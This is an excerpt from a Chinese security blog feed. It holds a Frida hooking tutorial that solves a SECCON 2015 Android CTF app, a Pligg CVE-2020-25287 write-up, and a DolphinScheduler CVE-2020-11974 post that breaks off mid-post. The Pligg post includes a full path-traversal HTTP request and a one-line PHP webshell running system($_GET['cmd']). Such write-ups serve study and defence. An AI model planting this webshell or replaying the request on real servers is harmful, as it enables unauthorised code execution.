class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def get_device_manager():</span><br><span class="line">    global _device_manager</span><br><span class="line">    if _device_manager is None:</span><br><span class="line">        from . import core</span><br><span class="line">        _device_manager &#x3D; core.DeviceManager(_frida.DeviceManager())</span><br><span class="line">    return _device_manager</span><br></pre></td></tr></table></figure><p>DeviceManager中enumerate_devices(）方法，可以看到enumerate_devices()方法实际上是返回了一个Device()类的实例化对象List。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">class DeviceManager(object):</span><br><span class="line">    def __init__(self, impl):</span><br><span class="line">        self._impl &#x3D; impl</span><br><span class="line"> </span><br><span class="line">    def __repr__(self):</span><br><span class="line">        return repr(self._impl)</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F;返回了一个Device()类的实例化。</span><br><span class="line">    def enumerate_devices(self):</span><br><span class="line">        return [Device(device) for device in self._impl.enumerate_devices()]</span><br><span class="line"> </span><br><span class="line">    def add_remote_device(self, host):</span><br><span class="line">        return Device(self._impl.add_remote_device(host))</span><br><span class="line"> </span><br><span class="line">    def remove_remote_device(self, host):</span><br><span class="line">        self._impl.remove_remote_device(host)</span><br><span class="line"> </span><br><span class="line">    def get_device(self, device_id):</span><br><span class="line">        devices &#x3D; self._impl.enumerate_devices()</span><br><span class="line">        if device_id is None:</span><br><span class="line">            return Device(devices[0])</span><br><span class="line">        for device in devices:</span><br><span class="line">            if device.id &#x3D;&#x3D; device_id:</span><br><span class="line">                return Device(device)</span><br><span class="line">        raise _frida.InvalidArgumentError(&quot;unable to find device with id %s&quot; % device_id)</span><br><span class="line"> </span><br><span class="line">    def on(self, signal, callback):</span><br><span class="line">        self._impl.on(signal, callback)</span><br><span class="line"> </span><br><span class="line">    def off(self, signal, callback):</span><br><span class="line">        self._impl.off(signal, callback)</span><br></pre></td></tr></table></figure><p>继续跟进Device类中的，就找到了attach()方法。在attach方法这是设置断点，看看传入的数据。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200923213529047.png" alt="image-20200923213529047"></p><p>接下来提供的“应用完整名”是通过self._pid_of()函数去找到对应的进程号pid，然后将pid后通过Session类初始化。到此第一句代码过程就算是明白了，最终得到的是一个对应进程号pid的Session实例化对象process。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">class Device(object):</span><br><span class="line">    def __init__(self, device):</span><br><span class="line">        self.id &#x3D; device.id</span><br><span class="line">        self.name &#x3D; device.name</span><br><span class="line">        self.icon &#x3D; device.icon</span><br><span class="line">        self.type &#x3D; device.type</span><br><span class="line">        self._impl &#x3D; device</span><br><span class="line"> </span><br><span class="line">    def __repr__(self):</span><br><span class="line">        return repr(self._impl)</span><br><span class="line"> </span><br><span class="line">    ...节省空间删除部分方法，详细内容可自行查看源码</span><br><span class="line"> </span><br><span class="line">    def kill(self, target):</span><br><span class="line">        self._impl.kill(self._pid_of(target))</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F;返回了一个Session的实例化对象</span><br><span class="line">    def attach(self, target):</span><br><span class="line">        return Session(self._impl.attach(self._pid_of(target)))</span><br><span class="line"> </span><br><span class="line">    def inject_library_file(self, target, path, entrypoint, data):</span><br><span class="line">        return self._impl.inject_library_file(self._pid_of(target), path, entrypoint, data)</span><br><span class="line"> </span><br><span class="line">    def inject_library_blob(self, target, blob, entrypoint, data):</span><br><span class="line">        return self._impl.inject_library_blob(self._pid_of(target), blob, entrypoint, data)</span><br><span class="line"> </span><br><span class="line">    def on(self, signal, callback):</span><br><span class="line">        self._impl.on(signal, callback)</span><br><span class="line"> </span><br><span class="line">    def off(self, signal, callback):</span><br><span class="line">        self._impl.off(signal, callback)</span><br><span class="line"> </span><br><span class="line">    def _pid_of(self, target):</span><br><span class="line">        if isinstance(target, numbers.Number):</span><br><span class="line">            return target</span><br><span class="line">        else:</span><br><span class="line">            return self.get_process(target).pid</span><br></pre></td></tr></table></figure><p>第二句，紧接着process.create_script(jscode)，可以看到它返回一个Script类的实例化，参数不确定。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def create_script(self, *args, **kwargs):</span><br><span class="line">        return Script(self._impl.create_script(*args, **kwargs))</span><br></pre></td></tr></table></figure><p>跟进Script类，可以找到on()方法，在on方法中可以设置自定义回调函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">class Script(object):</span><br><span class="line">    def __init__(self, impl):</span><br><span class="line">        self.exports &#x3D; ScriptExports(self)</span><br><span class="line"> </span><br><span class="line">        self._impl &#x3D; impl</span><br><span class="line">        self._on_message_callbacks &#x3D; []</span><br><span class="line">        self._log_handler &#x3D; self._on_log</span><br><span class="line"> </span><br><span class="line">        self._pending &#x3D; &#123;&#125;</span><br><span class="line">        self._next_request_id &#x3D; 1</span><br><span class="line">        self._cond &#x3D; threading.Condition()</span><br><span class="line"> </span><br><span class="line">        impl.on(&#39;destroyed&#39;, self._on_destroyed)</span><br><span class="line">        impl.on(&#39;message&#39;, self._on_message)</span><br><span class="line"> </span><br><span class="line">   ...节省空间删除部分类方法，详细内容可自行查看源码</span><br><span class="line"> </span><br><span class="line">    def load(self):</span><br><span class="line">        self._impl.load()</span><br><span class="line"> </span><br><span class="line">   &#x2F;&#x2F;设置自定义回调函数</span><br><span class="line">    def on(self, signal, callback):</span><br><span class="line">        if signal &#x3D;&#x3D; &#39;message&#39;:</span><br><span class="line">            self._on_message_callbacks.append(callback)</span><br><span class="line">        else:</span><br><span class="line">            self._impl.on(signal, callback)</span><br><span class="line"> </span><br><span class="line">在IDE中可以看到_on_message_callbacks中存放的on_message函数地址。</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200924155129213.png" alt="image-20200924155129213"><br>接下来调用load()方法，在服务端就启动javascript脚本了，至于在frida-server服务端怎么执行的，可逆向研究一下frida-server，它才是真正的核心。</p><h2 id="0x05-Javascript代码构造与执行"><a href="#0x05-Javascript代码构造与执行" class="headerlink" title="0x05 Javascript代码构造与执行"></a>0x05 Javascript代码构造与执行</h2><h3 id="方法一：获取calc-返回值"><a href="#方法一：获取calc-返回值" class="headerlink" title="方法一：获取calc()返回值"></a>方法一：获取calc()返回值</h3><p>第一种思路就是直接获取calc的返回值，从native函数定义上知道它的返回值是int类型，当然直接获取calc函数的返回值是解出问题最简单的方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public native int calc();</span><br></pre></td></tr></table></figure><p>那怎么获取calc()函数的返回值呢，这个函数在MainActivity类中，直接引用该类下的calc()方法，不就ok了吗，原理是这样，下面就来构造一下Javascript代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;Java.Perform 开始执行JavaScript脚本。</span><br><span class="line">Java.perform(function () &#123;</span><br><span class="line">&#x2F;&#x2F;定义变量MainActivity，Java.use指定要使用的类</span><br><span class="line">    var MainActivity &#x3D; Java.use(&#39;com.example.seccon2015.rock_paper_scissors.MainActivity&#39;);</span><br><span class="line">    &#x2F;&#x2F;hook该类下的onCreate方法，重新实现它</span><br><span class="line">    MainActivity.onClick.implementation &#x3D; function () &#123;</span><br><span class="line">        send(&quot;Hook Start...&quot;);</span><br><span class="line">        &#x2F;&#x2F;调用calc()方法，获取返回值</span><br><span class="line">        var returnValue &#x3D; this.calc();</span><br><span class="line">        send(&quot;Return:&quot;+returnValue);</span><br><span class="line">        var result &#x3D; (1000+returnValue)*107;</span><br><span class="line">        &#x2F;&#x2F;解出答案</span><br><span class="line">        send(&quot;Flag:&quot;+&quot;SECCON&#123;&quot;+result.toString()+&quot;&#125;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>JavaScript代码就是这样，如果不是很理解，学习一下JavaScript基础即可，下面看看完整的python脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># -*-coding:utf-8-*-</span><br><span class="line">import frida, sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def on_message(message, data):</span><br><span class="line">    if message[&#39;type&#39;] &#x3D;&#x3D; &#39;send&#39;:</span><br><span class="line">        print(&quot;[*] &#123;0&#125;&quot;.format(message[&#39;payload&#39;]))</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">jscode &#x3D; &quot;&quot;&quot;</span><br><span class="line">Java.perform(function () &#123;</span><br><span class="line">    var MainActivity &#x3D; Java.use(&#39;com.example.seccon2015.rock_paper_scissors.MainActivity&#39;);</span><br><span class="line">    MainActivity.onClick.implementation &#x3D; function () &#123;</span><br><span class="line">        send(&quot;Hook Start...&quot;);</span><br><span class="line">        var returnValue &#x3D; this.calc();</span><br><span class="line">        send(&quot;Return:&quot;+returnValue);</span><br><span class="line">        var result &#x3D; (1000+returnValue)*107;</span><br><span class="line">        send(&quot;Flag:&quot;+&quot;SECCON&#123;&quot;+result.toString()+&quot;&#125;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">process &#x3D; frida.get_usb_device().attach(&#39;com.example.seccon2015.rock_paper_scissors&#39;)</span><br><span class="line">script &#x3D; process.create_script(jscode)</span><br><span class="line">script.on(&#39;message&#39;, on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>不知道为什么hook的为应用的onCreate方法始终不行所以hook对应的onClick方法进行结果如下</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200924110841383.png" alt="image-20200924110841383"></p><h3 id="方法二：修改cnt的值为1000"><a href="#方法二：修改cnt的值为1000" class="headerlink" title="方法二：修改cnt的值为1000"></a>方法二：修改cnt的值为1000</h3><p>第二种思路也比较简单，我们需要修改cnt的值，但如果直接修改cnt的初始值为1000的话，在游戏中可能存在不确定因素，比如输了会置0，赢了cnt值就变成1001了，所以还得控制一下输赢，而输赢的条件是电脑出什么，所以最终hook的方法就在onClick中。<br>从onClick()中可以知道，控制输赢的在于修改this.n 和 this.m的值，再来看看源代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">private final Runnable showMessageTask &#x3D; new Runnable() &#123;</span><br><span class="line">        public void run() &#123;</span><br><span class="line">            TextView tv3 &#x3D; (TextView) MainActivity.this.findViewById(R.id.textView3);</span><br><span class="line">            MainActivity mainActivity;</span><br><span class="line">            &#x2F;&#x2F;我方:布 CPU：石头 or 我方：石头 CUP：剪刀 ，则为赢</span><br><span class="line">            if (MainActivity.this.n - MainActivity.this.m &#x3D;&#x3D; 1) &#123;</span><br><span class="line">                mainActivity &#x3D; MainActivity.this;</span><br><span class="line">                mainActivity.cnt++;</span><br><span class="line">                tv3.setText(&quot;WIN! +&quot; + String.valueOf(MainActivity.this.cnt));</span><br><span class="line">             &#x2F;&#x2F;反过来当然是输咯</span><br><span class="line">            &#125; else if (MainActivity.this.m - MainActivity.this.n &#x3D;&#x3D; 1) &#123;</span><br><span class="line">                MainActivity.this.cnt &#x3D; 0;</span><br><span class="line">                tv3.setText(&quot;LOSE +0&quot;);</span><br><span class="line">             &#x2F;&#x2F;一样则打平</span><br><span class="line">            &#125; else if (MainActivity.this.m &#x3D;&#x3D; MainActivity.this.n) &#123;</span><br><span class="line">                tv3.setText(&quot;DRAW +&quot; + String.valueOf(MainActivity.this.cnt));</span><br><span class="line">             &#x2F;&#x2F;我布  cup:剪刀</span><br><span class="line">            &#125; else if (MainActivity.this.m &lt; MainActivity.this.n) &#123;</span><br><span class="line">                MainActivity.this.cnt &#x3D; 0;</span><br><span class="line">                tv3.setText(&quot;LOSE +0&quot;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                mainActivity &#x3D; MainActivity.this;</span><br><span class="line">                mainActivity.cnt++;</span><br><span class="line">                tv3.setText(&quot;WIN! +&quot; + String.valueOf(MainActivity.this.cnt));</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F;获胜1000次则能够获取flag</span><br><span class="line">            if (1000 &#x3D;&#x3D; MainActivity.this.cnt) &#123;</span><br><span class="line">                tv3.setText(&quot;SECCON&#123;&quot; + String.valueOf((MainActivity.this.cnt + MainActivity.this.calc()) * 107) + &quot;&#125;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            MainActivity.this.flag &#x3D; 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure><p>JavaScript代码编写如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(function () &#123;</span><br><span class="line">    var MainActivity &#x3D; Java.use(&#39;com.example.seccon2015.rock_paper_scissors.MainActivity&#39;);</span><br><span class="line">    &#x2F;&#x2F;hook onClick方法，此处要注意的是onClick方法是传递了一个View参数v</span><br><span class="line">    MainActivity.onClick.implementation &#x3D; function (v) &#123;</span><br><span class="line">        send(&quot;Hook Start...&quot;);</span><br><span class="line">        &#x2F;&#x2F;调用onClick,模拟点击事件</span><br><span class="line">        this.onClick(v);</span><br><span class="line">        &#x2F;&#x2F;修改参数  满足第一个if 或者 最后一个else即可</span><br><span class="line">        this.n.value &#x3D; 0;</span><br><span class="line">        this.m.value &#x3D; 2;</span><br><span class="line">        this.cnt.value &#x3D; 999;</span><br><span class="line">        send(&quot;Success!&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>完整python代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import frida, sys</span><br><span class="line"> </span><br><span class="line">def on_message(message, data):</span><br><span class="line">    if message[&#39;type&#39;] &#x3D;&#x3D; &#39;send&#39;:</span><br><span class="line">        print(&quot;[*] &#123;0&#125;&quot;.format(message[&#39;payload&#39;]))</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br><span class="line"> </span><br><span class="line">jscode &#x3D; &quot;&quot;&quot;</span><br><span class="line">Java.perform(function () &#123;</span><br><span class="line">    var MainActivity &#x3D; Java.use(&#39;com.example.seccon2015.rock_paper_scissors.MainActivity&#39;);</span><br><span class="line">    MainActivity.onClick.implementation &#x3D; function (v) &#123;</span><br><span class="line">        send(&quot;Hook Start...&quot;);</span><br><span class="line">        this.onClick(v);</span><br><span class="line">        this.n.value &#x3D; 0;</span><br><span class="line">        this.m.value &#x3D; 2;</span><br><span class="line">        this.cnt.value &#x3D; 999;</span><br><span class="line">        send(&quot;Success!&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"> </span><br><span class="line">process &#x3D; frida.get_usb_device().attach(&#39;com.example.seccon2015.rock_paper_scissors&#39;)</span><br><span class="line">script &#x3D; process.create_script(jscode)</span><br><span class="line">script.on(&#39;message&#39;, on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>执行python脚本，任意点击按钮，答案就出来了。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200924112142535.png" alt="image-20200924112142535"></p><h3 id="方法三：分析calc-方法算出答案"><a href="#方法三：分析calc-方法算出答案" class="headerlink" title="方法三：分析calc()方法算出答案"></a>方法三：分析calc()方法算出答案</h3><p>calc() 这个方法在so中，对应的分析汇编代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">static &#123;</span><br><span class="line">  System.loadLibrary(&quot;calc&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public native int calc();</span><br></pre></td></tr></table></figure><p>直接使用ida pro或者radare2分析汇编代码也是可以的。这里给出用radare2反汇编出来的代码。可以看到，calc()函数就单纯的返回了int值7</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200924113024992.png" alt="image-20200924113024992"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200924114127105.png" alt="image-20200924114127105"></p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p><strong>一般分析流程</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.反编译apk，分析代码寻找hook点。</span><br><span class="line">2.编写js代码，调用类的方法或者替换。</span><br><span class="line">3.在python中执行即可。</span><br></pre></td></tr></table></figure><h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a href="https://bbs.pediy.com/thread-227232.htm">https://bbs.pediy.com/thread-227232.htm</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-概述&quot;&gt;&lt;a href=&quot;#0x00-概述&quot; class=&quot;headerlink&quot; title=&quot;0x00 概述&quot;&gt;&lt;/a&gt;0x00 概述&lt;/h2&gt;&lt;p&gt;Frida是个轻量级别的hook框架&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;是Python API，但Jav
      
    
    </summary>
    
    
      <category term="Android" scheme="http://www.ol4three.com/categories/Android/"/>
    
    
      <category term="Frida" scheme="http://www.ol4three.com/tags/Frida/"/>
    
      <category term="Hook" scheme="http://www.ol4three.com/tags/Hook/"/>
    
  </entry>
  
  <entry>
    <title>Pligg远程命令执行(CVE-2020-25287)</title>
    <link href="http://www.ol4three.com/2020/09/17/WEB/Exploit/Pligg%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-CVE-2020-25287/"/>
    <id>http://www.ol4three.com/2020/09/17/WEB/Exploit/Pligg%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-CVE-2020-25287/</id>
    <published>2020-09-17T09:39:41.000Z</published>
    <updated>2020-12-01T12:15:42.101Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><code>the_file</code>由于无需检查扩展名，我们可以通过模板编辑器菜单使用参数来访问任何文件，然后将webshell创建到现有的php文件中</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Pligg2.0.3版本</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917174643966.png" alt="image-20200917174643966"></p><p>转到<code>/admin/admin_editor.php</code>拦截请求并将路径更改为文件。</p><p>例如得到<code>index.php</code>申请：<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917174701957.png" alt="image-20200917174701957"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;admin&#x2F;admin_editor.php HTTP&#x2F;1.1</span><br><span class="line">Host: kliqqi</span><br><span class="line">Content-Length: 33</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;kliqqi</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.102 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;kliqqi&#x2F;admin&#x2F;admin_editor.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: fr-FR,fr;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7</span><br><span class="line">Cookie: panelState&#x3D;CollapseManage%7CCollapseSettings%7CCollapseTemplate; PHPSESSID&#x3D;lfkc3gtrv5o1golmt5md3; mnm_user&#x3D;Admin; mnm_key&#x3D;QWRtaW46MjI0R2dEVTAxZncxZzpl</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">the_file&#x3D;..%2Findex.php&amp;open&#x3D;Open</span><br></pre></td></tr></table></figure><p>模版编辑器功能可以编辑任意文件内容,在文件中加入恶意代码导致代码执行。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917174734515.png" alt="image-20200917174734515"></p><p>比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  if($_GET[&#39;cmd&#39;])&#123;</span><br><span class="line">    system($_GET[&#39;cmd&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问<code>website.fr?cmd=dir</code></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917174826813.png" alt="image-20200917174826813"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;&lt;code&gt;the_file&lt;/code&gt;由于无需检查扩展名，我们可以通过模板编辑器菜单使用参数来访问任何文件，然后将web
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Pligg" scheme="http://www.ol4three.com/tags/Pligg/"/>
    
  </entry>
  
  <entry>
    <title>Apache DolphinScheduler远程代码执行(CVE-2020-11974)</title>
    <link href="http://www.ol4three.com/2020/09/17/WEB/Exploit/Apache-DolphinScheduler%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2020-11974/"/>
    <id>http://www.ol4three.com/2020/09/17/WEB/Exploit/Apache-DolphinScheduler%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2020-11974/</id>
    <published>2020-09-17T09:02:36.000Z</published>
    <updated>2020-12-01T12:14:47.689Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Apache-DolphinScheduler组件介绍"><a href="#Apache-DolphinScheduler组件介绍" class="headerlink" title="Apache DolphinScheduler组件介绍"></a>Apache DolphinScheduler组件介绍</h2><p>​    Apache DolphinScheduler(incubator,原EasyScheduler）是一个分布式工作流任务调度系统，主要解决数据研发ETL错综复杂的依赖关系，不能直观监控任务健康状态。DolphinScheduler以DAG流式的方式将Task组装起来，可实时监控任务的运行状态，同时支持重试、从指定节点恢复失败、暂停及Kill任务等操作。</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>​    CVE-2020-11974与mysql connectorj远程执行代码漏洞有关，在选择mysql作为数据库时，攻击者可通过jdbc connect参数输入{“detectCustomCollations”:true，“autoDeserialize”:true} 在DolphinScheduler 服务器上远程执行代码。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>受影响版本<br>Apache DolphinScheduler = 1.2.0、1.2.1</p><p>安全版本<br>Apache DolphinScheduler &gt;= 1.3.1</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>需要登陆权限</p><p>该漏洞存在于数据源中心未限制添加的jdbc连接参数,从而实现JDBC客户端反序列化。</p><p>1、登录到面板 -&gt; 数据源中心。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917170923674.png" alt="image-20200917170923674"></p><p>2、jdbc连接参数就是主角,这里没有限制任意类型的连接串参数。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917170947012.png" alt="image-20200917170947012"></p><p>3、将以下数据添加到jdbc连接参数中,就可以直接触发。</p><p><img 